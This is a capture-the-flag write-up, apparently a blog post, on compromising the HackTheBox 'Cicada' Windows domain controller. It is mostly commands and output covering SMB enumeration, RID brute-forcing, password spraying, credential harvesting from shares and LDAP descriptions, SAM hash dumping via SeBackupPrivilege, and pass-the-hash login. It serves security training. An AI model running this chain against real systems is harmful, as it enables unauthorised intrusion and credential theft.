---
layout: post
title: "Cicada HackTheBox"
# date: 2024-12-29 10:00:00 +0700
categories: [ctf]
tags: [ctf, windows, hackthebox]
image: /assets/images/Cicada.png
---

## Scanning open port
```shell
$ nmap -sVC -T5 -v -Pn 10.10.11.35
Scanning 10.10.11.35 [1000 ports]
Discovered open port 445/tcp on 10.10.11.35
Discovered open port 53/tcp on 10.10.11.35
Discovered open port 135/tcp on 10.10.11.35
Discovered open port 139/tcp on 10.10.11.35
Discovered open port 3269/tcp on 10.10.11.35
Discovered open port 3268/tcp on 10.10.11.35
Discovered open port 593/tcp on 10.10.11.35
Discovered open port 636/tcp on 10.10.11.35
Discovered open port 88/tcp on 10.10.11.35
Discovered open port 389/tcp on 10.10.11.35
Discovered open port 464/tcp on 10.10.11.35
Completed Connect Scan at 18:41, 5.77s elapsed (1000 total ports)
```

## SMB Enumeration
Enumeration of SMB shares revealed accessible directories and files, including a critical text file in the HR share, which contained a default password for new hires. This information was pivotal in gaining initial access.
```shell
$ nxc smb 10.10.11.35 -u 'x' -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\x: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
```

## Found password from "Notice from HR.txt" file
The Notice from HR.txt file disclosed the default credentials for a user account. These credentials were subsequently tested for validity and used to enumerate further information.
```shell
$ smbclient -N //10.10.11.35/HR -U 'x' 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 19:29:09 2024
  ..                                  D        0  Thu Mar 14 19:21:29 2024
  Notice from HR.txt                  A     1266  Thu Aug 29 00:31:48 2024

                4168447 blocks of size 4096. 341524 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (13.4 KiloBytes/sec) (average 13.4 KiloBytes/sec)
smb: \>
```

```
File: Notice from HR.txt

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

## Getting Username RID Bruteforce
RID brute-forcing was employed to enumerate valid usernames on the domain. This technique helped identify several user accounts, which were later used in credential spraying attempts.
```shell
$ nxc smb 10.10.11.35 -u 'x' -p '' --rid-brute | grep SidTypeUser                                                                                          
SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

## Filtering
The user list was cleaned and extracted from enumeration results to isolate potential usernames. This simplified subsequent spraying attacks by narrowing the scope.
```shell
$ cat user.txt | awk -F " " '{print $6}' | cut -d "\\" -f2 | tee users.txt
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

## SMB Password sparying using `users.txt` and `Cicada$M6Corpb*@Lp#nZp!8`
Using the extracted usernames and the default password, a password-spraying attack was conducted. This resulted in identifying valid credentials for the michael.wrightson account.
```shell
$ nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'                                                                                           
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
``` 

## Found david.orelious passsword from Description
The LDAP enumeration exposed sensitive details in the david.orelious user account description, which included the plaintext password. This demonstrated the impact of improper information handling within account descriptions.
```shell
$ nxc ldap 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        [*] Total records returned: 8
LDAP        10.10.11.35     389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                  
LDAP        10.10.11.35     389    CICADA-DC        Administrator                 2024-08-26 20:08:03 5       Built-in account for administering the computer/domain                                                                                                                                                      
LDAP        10.10.11.35     389    CICADA-DC        Guest                         2024-08-28 17:26:56 1       Built-in account for guest access to the computer/domain                                                                                                                                                    
LDAP        10.10.11.35     389    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account        
LDAP        10.10.11.35     389    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 4                                                      
LDAP        10.10.11.35     389    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 5                                                      
LDAP        10.10.11.35     389    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0                                                      
LDAP        10.10.11.35     389    CICADA-DC        david.orelious                2024-03-14 12:17:29 2       Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                                                                                                         
LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0


david.orelious Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                                                                                                         
```

## Logged in as david.orelious and found the DEV Shares folder
Gaining access as david.orelious revealed additional SMB shares, including the DEV share, which contained a PowerShell script exposing another set of credentials.
```shell
$ nxc smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares             
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
```

## Found emily.oscars password from Backup_script.ps1 file
The Backup_script.ps1 file located in the DEV share revealed credentials for the emily.oscars user account. This highlighted the risks of storing sensitive credentials in plaintext scripts.
```shell
$ smbclient //10.10.11.35/DEV -U 'david.orelious'   
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 19:31:39 2024
  ..                                  D        0  Thu Mar 14 19:21:29 2024
  Backup_script.ps1                   A      601  Thu Aug 29 00:28:22 2024

                4168447 blocks of size 4096. 342599 blocks available
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (6.8 KiloBytes/sec) (average 6.8 KiloBytes/sec)
smb: \> exit

$ cat Backup_script.ps1                                                                                                                                    
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

## WINRM Pwned!
Using the newly obtained credentials, access was achieved via WINRM as emily.oscars. This provided a foothold on the target machine, enabling deeper exploration and privilege escalation.
```shell
$ nxc winrm 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'         
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
7070494894b463964b8cac9d1ef3feaf
```

## Privilege Escalation
With the emily.oscars account, elevated privileges were possible due to enabled permissions such as SeBackupPrivilege. These privileges were exploited to extract critical registry hives for further escalation.
```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

## SeBackupPrivilege Privilege Escalation Method
Reference: [https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

```shell
$ pypykatz registry --sam sam system 
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

## Logged in as Administrator
The Administrator account was successfully compromised, providing full control over the target machine. This concluded the exploitation phase of the challenge.
```shell
evil-winrm -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341' -i 10.10.11.35
                                        
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
```